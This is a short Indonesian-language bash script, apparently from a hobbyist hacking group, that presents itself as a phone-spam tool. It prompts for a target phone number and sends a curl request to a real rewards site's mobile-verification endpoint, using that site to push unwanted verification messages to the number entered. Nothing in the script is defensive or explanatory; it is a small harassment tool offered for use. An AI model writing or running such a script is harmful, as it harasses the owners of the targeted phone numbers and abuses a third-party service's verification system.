#!/bin/bash

figlet Spam | lolcat
figlet Nelpon | lolcat
echo "==========================================="
echo "Author : Mr.T1T4N"
echo "Team : Indonesia Cyber | Linux Cyber"
echo "Youtube : T1T4N TZY"
echo "==========================================="
echo
echo "==========================================="
echo "1). Spam Sekarang"
echo "99). Keluar"
echo "==========================================="
read -p "PilihLah Sesuka Kalian :" who

if [ $who = 1 ]
then
read -p "Spam Sekarang :" nomor
link=https://id.jagreward.com/member/verify-mobile/$nomor
curl -S $link
fi
